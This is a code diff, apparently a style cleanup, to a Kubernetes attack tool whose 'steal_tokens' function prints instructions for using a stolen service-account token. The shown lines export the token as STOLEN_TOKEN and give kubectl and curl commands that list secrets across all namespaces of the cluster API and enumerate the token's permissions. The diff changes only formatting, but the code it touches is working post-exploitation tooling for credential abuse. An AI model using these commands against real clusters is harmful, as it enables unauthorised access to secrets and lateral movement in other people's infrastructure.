@@ -1,7 +1,7 @@
 import base64
 import json
-from kubernetes.client.rest import ApiException
 
+from kubernetes.client.rest import ApiException
 
 INTERESTING_PATTERNS = [
     "admin",
@@ -105,15 +105,15 @@ def steal_tokens(k8s, namespace: str = "all") -> str:
             lines.append(f"     export STOLEN_TOKEN='{raw_token}'")
             lines.append("")
             lines.append("     ── kubectl ──────────────────────────────────────")
-            lines.append(f"     kubectl --token=$STOLEN_TOKEN get secrets --all-namespaces")
-            lines.append(f"     kubectl --token=$STOLEN_TOKEN auth can-i --list")
+            lines.append("     kubectl --token=$STOLEN_TOKEN get secrets --all-namespaces")
+            lines.append("     kubectl --token=$STOLEN_TOKEN auth can-i --list")
             lines.append("")
             lines.append("     ── curl in-cluster (no kubectl needed) ──────────")
             lines.append(
-                f'     curl -H "Authorization: Bearer $STOLEN_TOKEN" \\\n'
-                f"       https://kubernetes.default.svc/api/v1/secrets \\\n"
-                f"       --cacert /var/run/secrets/kubernetes.io/"
-                f"serviceaccount/ca.crt"
+                '     curl -H "Authorization: Bearer $STOLEN_TOKEN" \\\n'
+                "       https://kubernetes.default.svc/api/v1/secrets \\\n"
+                "       --cacert /var/run/secrets/kubernetes.io/"
+                "serviceaccount/ca.crt"
             )
             lines.append("")
             lines.append("     ── check what this token can do ─────────────────")
